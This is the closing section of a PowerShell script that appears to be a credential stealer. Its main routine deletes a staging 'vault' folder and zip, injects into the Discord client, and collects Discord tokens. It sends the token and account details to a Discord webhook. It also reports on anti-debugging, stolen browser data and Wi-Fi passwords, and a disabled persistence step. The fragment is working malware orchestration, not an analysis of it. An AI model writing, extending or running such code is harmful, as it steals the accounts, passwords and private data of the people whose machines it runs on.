    } catch{}
    # --- remove vault ---
    try {
        Remove-Item -Path $outputDir -Recurse -Force
        Remove-Item -Path $zipPath -Force
    } catch{}

    $InjectStatus = $true
    try {
        Invoke-DiscordInjection -Webhook $webhookUrl
    }catch {
        $InjectStatus = $false
    }


    # --- get the discord tokens ---
    $TokenStatus = $true
    try {
        $tokens = Get-DiscordTokens
        if ($tokens) {
            foreach ($token in $tokens) {
                $tokenInfo = Get-TokenInfo -Token $token
                $embed = Create-TokenEmbed -TokenInfo $tokenInfo
                Send-DiscordEmbed -Embed $embed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
            }
        }
    }
    catch {
        $TokenStatus = $false
    }

    # $StartUpStatus = Add-StartupScript  # Persistence disabled
    $StartUpStatus = $false  # Set to false since persistence is disabled

    # --- send the all done embed with all of the statuses ---
    try{
        $embed = Create-AllDoneEmbed -AntiDebugStatus $AntiDebugStatus -BrowserDataStatus $BrowserDataStatus -WifiPasswordStatus $WifiPasswordStatus -TokenStatus $TokenStatus -InjectStatus $InjectStatus -StartUpStatus $StartUpStatus
        Send-DiscordEmbed -Embed $embed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
    } catch{}

}
#endregion
Main
